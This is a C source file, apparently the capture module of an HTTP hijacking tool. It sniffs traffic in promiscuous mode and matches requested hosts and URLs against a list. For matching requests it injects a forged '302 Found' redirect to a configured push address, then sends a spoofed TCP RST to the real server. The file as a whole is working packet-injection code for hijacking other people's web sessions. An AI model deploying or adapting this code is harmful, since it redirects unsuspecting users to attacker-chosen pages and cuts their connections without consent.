#include "capture.h"
#include "conf.h"
#include "lkf_queue.h"
#include "urls.h"
#include "log.h"
#include "http_parser.h"
#include "util.h"
#include <pthread.h>
#include <pcap/pcap.h>
#include <stdlib.h>
#include <pcap/bpf.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netinet/in.h> 
#include <linux/ip.h>
#include <linux/tcp.h>
#include <libnet.h>

#define DEFAULT_CAP_THREAD_NUM  8
#define DEFAULT_CAP_RING_NUM    2048
#define DEFAULT_CAP_FILTER      "greater 100 and dst port 80"
#define DEFAULT_CAP_BUF_SIZE    512 * 1024 * 1024  //512m

#define MAX_PACKET_LEN  65535

#define MAX_PACKET_STATUE  1000000
#define MAX_HOST_LEN   256

static const char http_302_str[] = "HTTP/1.1 302 Found\r\nContent-Length: 0\r\n"
                                "Cache-Control:no-store, no-cache\r\nExpires: Sat, 18 Jul 1988 05:00:00\r\n"
                                "Pragma: no-cache\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nLocation: ";

char pushaddr[MAX_URL_LEN];

uint8_t srcmac[6] = {0};

typedef struct {
    int                index;
    pthread_t          tid;
    lkf_ring_t        *ring;
    libnet_t          *inject_net;
} cap_thread_t;

typedef struct {
    u_char raw[MAX_PACKET_LEN];
    size_t len;
} cap_packet_t;

typedef struct {
    int  hflag;
    char host[MAX_HOST_LEN];
    char url[MAX_URL_LEN];
} cap_url_t;

cap_thread_t  *cap_threads;
size_t         cap_num;

volatile uint8_t  ether_mac[6];

static int cap_on_headers_complete(http_parser *parser);
static int cap_header_field_cb(http_parser *parser, const char *buf, size_t len);
static int cap_header_value_cb(http_parser *parser, const char *buf, size_t len);
static int cap_url_cb(http_parser *parser, const char *buf, size_t len);

static http_parser_settings parser_settings = {
    .on_headers_complete = cap_on_headers_complete
   ,.on_header_field     = cap_header_field_cb
   ,.on_header_value     = cap_header_value_cb
   ,.on_url              = cap_url_cb
};

static int cap_on_headers_complete(http_parser *parser)
{
    return -1;
}

static int cap_header_field_cb(http_parser *parser, const char *buf, size_t len)
{
    cap_url_t *url = (cap_url_t *)parser->data;

    if (len == 4 && strncasecmp(buf, "host", 4) == 0) {
        url->hflag = 1;
    } else {
        url->hflag = 0;
    }

    return 0;
}

static int cap_header_value_cb(http_parser *parser, const char *buf, size_t len)
{
    cap_url_t *url = (cap_url_t *)parser->data;

    if (url->hflag == 0) {
        return 0;
    }

    if (len >= MAX_HOST_LEN) {
        return 1;
    }

    memcpy(url->host, buf, len);

    return -1;
}

static int cap_url_cb(http_parser *parser, const char *buf, size_t len)
{
    cap_url_t *url = (cap_url_t *)parser->data;

    if (len >= MAX_URL_LEN) {
        return -1;
    }

    memcpy(url->url, buf, len);

    return 0;
}

static int cap_service_need_hijack(u_char *http_data, size_t n, cap_url_t *url)
{
    int         parserd;
    http_parser parser;
    char       *pos;
    char        tmp[MAX_URL_LEN];

    memset(url, 0x00, sizeof(cap_url_t));

    http_parser_init(&parser, HTTP_REQUEST);
    parser.data = url;
    parserd = http_parser_execute(&parser, &parser_settings, (char *)http_data, n);
    if (parserd != n && HTTP_PARSER_ERRNO(&parser) != HPE_CB_header_value) {
        log_debug("capture bad format http request");
        return 0;
    }

    pos = strchr(url->url, '?');
    if (pos != NULL) {
        *pos = 0;
    }

    memset(tmp, 0x00, sizeof(tmp));
    snprintf(tmp, MAX_URL_LEN, "%s%s", url->host, url->url);

    return has_url(tmp);
}

static void cap_service_packet_inject_rst(struct ether_header *eth_hdr,
                                        struct iphdr        *ip_hdr,
                                        struct tcphdr       *tcp_hdr,
                                        cap_thread_t *thread)
{
    libnet_t *inject_net = thread->inject_net;

	if(libnet_build_tcp(ntohs(tcp_hdr->source),          // sp
		ntohs(tcp_hdr->dest),                          // dp
		ntohl(tcp_hdr->seq),                            // seq
        ntohl(tcp_hdr->ack_seq),                            // ack
        TH_RST,
		tcp_hdr->window,                   // win
		0,                             // sum
		0,                             // urg
		LIBNET_TCP_H,                  // len
		NULL,                          // payload
		0,                             // paylen
		inject_net,                    // libnet
		0) == -1)                      // ptag
	{
		goto failed;
    }
    
	if(libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, // len
		0,                            // tos
		ip_hdr->id,                // id
		0,                            // frag
		51,							  // ttl
		IPPROTO_TCP,                  // prot
		0,                            // sum
		ip_hdr->saddr,        // src
		ip_hdr->daddr,        // dst
		NULL,                         // payload
		0,                            // paylen
		inject_net,                   // libnet
		0) == -1)                     // ptag
	{
		goto failed;
	}    

	if(libnet_build_ethernet((void*) ether_mac,  // dst
		(void*)srcmac,                           // src
		ETHERTYPE_IP,                            // prot
		NULL,                                    // payload
		0,                                       // paylen
		inject_net,                              // libnet
		0) == -1)                                // ptag
	{
		goto failed;
	}

	if(libnet_write(inject_net) == -1) {
		goto failed;
	}

    libnet_clear_packet(inject_net);
    
    return;
    
failed:
    log_error("failed send rst to source website[%s]", libnet_geterror(inject_net));
    libnet_clear_packet(inject_net);
    return;
}

static void cap_service_packet_inject_app(struct ether_header *eth_hdr,
                                      struct iphdr        *ip_hdr,
                                      struct tcphdr       *tcp_hdr,
                                      uint32_t             tcp_dl,
                                      cap_url_t *url,
                                      cap_thread_t *thread)
{
    int   inject_len;
    char  inject_packet[2 * MAX_URL_LEN];
    
    libnet_t *inject_net = thread->inject_net;

    inject_len = snprintf(inject_packet, 2 * MAX_URL_LEN, "%s%s?domain=%s&uri=%s\r\n\r\n", http_302_str, pushaddr, 
                                    url->host, url->url);

    /*start send payload packet*/
    if(libnet_build_tcp(ntohs(tcp_hdr->dest),               // sp
                        ntohs(tcp_hdr->source),               // dp
                        ntohl(tcp_hdr->ack_seq),                 // seq
                        ntohl(tcp_hdr->seq) + tcp_dl,        // ack
#ifdef WITH_FIN
                        TH_FIN|TH_PUSH|TH_ACK,                  // ctl
#else
                        TH_PUSH|TH_ACK,
#endif
                        tcp_hdr->window,                             // win
                        0,                                       // sum
                        0,                                       // urg
                        LIBNET_TCP_H + inject_len,	             // len
                        (uint8_t *)inject_packet,                // payload
                        inject_len,                              // paylen
                        inject_net,                              // libnet
                        0) == -1)                                // ptag    
    {
        goto failed;
    }

	if(libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H + inject_len, // len
		0,                                // tos
		ip_hdr->id,                    // id
		0,                                // frag
		51,							      // ttl
		IPPROTO_TCP,                      // prot
		0,                                // sum
		ip_hdr->daddr,            // src
		ip_hdr->saddr,            // dst
		NULL,                             // payload
		0,                                // paylen
		inject_net,                       // libnet
		0) == -1)                         // ptag
	{
		goto failed;
    }
    
	if(libnet_build_ethernet((void *)ether_mac,   // dst
		(void *)srcmac,                           // src
		ETHERTYPE_IP,                             // prot
		NULL,                                     // payload
		0,                                        // paylen
		inject_net,                               // libnet
		0) == -1)                                 // ptag
	{
		goto failed;
	}

	// Attempt to send.
	if(libnet_write(inject_net) == -1)
	{
        goto failed;
    }
    
    libnet_clear_packet(inject_net);

    return;

failed:
    log_error("failed send inject packet to client[%s]", libnet_geterror(inject_net));
    libnet_clear_packet(inject_net);
    return;
}

static void cap_service_working_helper(cap_packet_t *packet, cap_thread_t *thread)
{
    u_char              *cp;
    uint8_t              tcp_hl;
    uint16_t             tcp_dl;
    uint16_t             eth_t;
    size_t               len;
    cap_url_t            url;
    struct ether_header *eth_hdr;
    struct iphdr        *ip_hdr;
    struct tcphdr       *tcp_hdr;

    cp = packet->raw;
    len = packet->len;

    eth_hdr = (struct ether_header *)cp;
    eth_t = ntohs(eth_hdr->ether_type);

	// We only care about IP packets containing at least a full IP+TCP header.
	if(eth_t != 0x0800 && eth_t != 0x8100) {
        return;
    }

    cp = cp + ETHER_HDR_LEN;
    len = len - ETHER_HDR_LEN;

	/* Is PPOE packet*/
	if (eth_hdr->ether_type == 0x8100) {
		cp = cp + 2;

		if (cp[0] != 0x88 && cp[1] != 0x64)
			return;
		
		/* Skip PPP header region*/
        cp = cp + 10;  

        len = len - 12;     
    }

    if (len <= sizeof(ip_hdr)) return;
    
	ip_hdr = (struct iphdr *) cp;
    if(ip_hdr->version != 4 || ip_hdr->protocol != IPPROTO_TCP) {
        return; 
    }

    cp = cp + (ip_hdr->ihl * 4);
    len = len - (ip_hdr->ihl * 4);

    if (len <= sizeof(struct tcphdr)) return;

    tcp_hdr = (struct tcphdr*)cp;

    if (tcp_hdr->rst) return;

    tcp_hl = tcp_hdr->doff * 4;
    tcp_dl = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - tcp_hl;

    cp = cp + tcp_hl;
    len = len - tcp_hl;

    if (len <= 0) return;

    if (cap_service_need_hijack(cp, len, &url)) {
        cap_service_packet_inject_app(eth_hdr, ip_hdr, tcp_hdr, tcp_dl, &url, thread);
        cap_service_packet_inject_rst(eth_hdr, ip_hdr, tcp_hdr, thread);
    }

    return;
}

static void *cap_service_working(void *arg)
{
    cap_thread_t *thread = (cap_thread_t *)arg;
    cap_packet_t *packet;

    if (stick_thread_to_core(thread->index)) {
        log_fatal("capture service, failed stick thread %s to core", thread->index);
        exit(1);
    }

    while (1) {
        while (!(packet = (cap_packet_t *)lkf_ring_pop(thread->ring))) {
            usleep(50);
        }

        cap_service_working_helper(packet, thread);
        free(packet);
    }

    return NULL;
}

/*这里使用一个线程读一个线程写的队列机制, 避免使用锁*/
static void cap_service_init_thread(hijack_conf_t *conf)
{
    int    i;
    char   errbuf[LIBNET_ERRBUF_SIZE];

    cap_num = conf->cap_thread <= 0 ? DEFAULT_CAP_THREAD_NUM : conf->cap_thread;

    cap_threads = (cap_thread_t *)calloc(cap_num, sizeof(cap_thread_t));

    for (i = 0; i < cap_num; i++) {
        cap_threads[i].index = i;
        cap_threads[i].ring = lkf_ring_init(DEFAULT_CAP_RING_NUM);
        cap_threads[i].inject_net = libnet_init(LIBNET_LINK, (const char *)conf->net_send, errbuf);
        if (cap_threads[i].inject_net == NULL) {
            log_error("failed init packet inject interface, %s", errbuf);
            exit(1);
        }        

        if (pthread_create(&cap_threads[i].tid, NULL, cap_service_working, &cap_threads[i])) {
            log_error("failed to create capture worker thread");
            exit(-1);
        }
        pthread_detach(cap_threads[i].tid);
    }

    return;
}

static int cap_push_packet(cap_packet_t *packet)
{
    static int index = 0;

    int try, ret;

    try = 0;
    while (try < cap_num) {
        ret = lkf_ring_push(cap_threads[index].ring, packet);
        if (!ret) {
            if (++index >= cap_num) {
                index = 0;
            }

            return 0;
        }

        if (++index >= cap_num) {
            index = 0;
        }
        ++try;
    }

    return -1;
}

void *cap_service(void *arg)
{
    int            ret;
    uint32_t       pn, ln;
    const u_char  *raw;
    char           errbuf[PCAP_ERRBUF_SIZE];
    pcap_t        *pcap;
    bpf_u_int32    netp;
    bpf_u_int32    mask;
    struct bpf_program   fp;
    struct pcap_pkthdr  *pkthdr;
    struct pcap_stat     ps;

    hijack_conf_t *conf;

    cap_packet_t *packet;
    
    conf = (hijack_conf_t *)arg;

    if (get_net_mac(conf->net_send, srcmac)) {
        log_error("failed init inject mac address");
        exit(-1);
    }

    cap_service_init_thread(conf);

    pcap = pcap_create(conf->net_pcap, errbuf);
    if (!pcap) {
        log_error("failed init capture handler, %s", errbuf);
        exit(-1);
    }

    pcap_lookupnet(conf->net_pcap, &netp, &mask, errbuf);
/*    
    if (pcap_set_snaplen(pcap, MAX_PACKET_LEN)) {
        log_error("failed set capture packet length, %s", pcap_geterr(pcap));
        exit(1);
    }    
*/

/*
    if (pcap_set_buffer_size(pcap, DEFAULT_CAP_BUF_SIZE)) {
        log_error("failed set capture buffer size, %s", pcap_geterr(pcap));
        exit(1);
    }
*/

    if (pcap_set_promisc(pcap, 1)) {
        log_error("failed set capture promisc mode, %s", pcap_geterr(pcap));
        exit(1);
    }

    if (pcap_activate(pcap) < 0) {
        log_error("failed activate capture handler, %s", pcap_geterr(pcap));
        exit(1);
    }

    if (pcap_compile(pcap, &fp, conf->cap_filter ? conf->cap_filter : DEFAULT_CAP_FILTER, 0, netp) == -1) {
        log_error("failed compile capture filter, %s", pcap_geterr(pcap));
        exit(1);
    }

    if(pcap_setfilter(pcap, &fp)) {
        log_error("failed set capture filter, %s", pcap_geterr(pcap));
        exit(1);
    }

    if (pcap_setdirection(pcap, PCAP_D_IN)) {
        log_error("failed set capture direction, %s", pcap_geterr(pcap));
        exit(1);
    }

    ret = sscanf(conf->sendmac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ether_mac[0], &ether_mac[1], &ether_mac[2], &ether_mac[3], &ether_mac[4], &ether_mac[5]);
    if (ret != 6) {
        log_error("failed init packet inject dst mac address");
        exit(-1);
    }

    strncpy(pushaddr, conf->pushaddr, MAX_URL_LEN - 1);
    
    pn = 0;
    ln = 0;
    while (1) {
        memset(&pkthdr, 0x00, sizeof(struct pcap_pkthdr));

		ret = pcap_next_ex(pcap, &pkthdr, &raw);
		if (ret != 1) {
            log_warn("capture unexpected return[%s], continue capture", ret == 0 ? "Timedout" : pcap_geterr(pcap));
            continue;
        }

        pn++;

        if (pkthdr->caplen > MAX_PACKET_LEN || pkthdr->caplen < 100) {
            log_warn("capture very big or small packet, discard it");
            continue;
        }
        
        packet = (cap_packet_t *)calloc(1, sizeof(cap_packet_t));
        if (packet == NULL) {
            log_warn("capture thread lack of memory");
            continue;
        }

        memcpy(packet->raw, raw, pkthdr->caplen);
        packet->len = pkthdr->caplen;

        ret = cap_push_packet(packet);
        if (ret == -1) {
            free(packet);
            ln++;
        }

        if (pn > MAX_PACKET_STATUE) {
            pcap_stats(pcap, &ps);
            log_info("capture status: %d(ps_recv)  %d(ps_drop)  %d(ps_ifdrop)  %d(app_lose)", ps.ps_recv, ps.ps_drop, ps.ps_ifdrop, ln);
            pn = 0;
            ln = 0;
        }
	}    
}
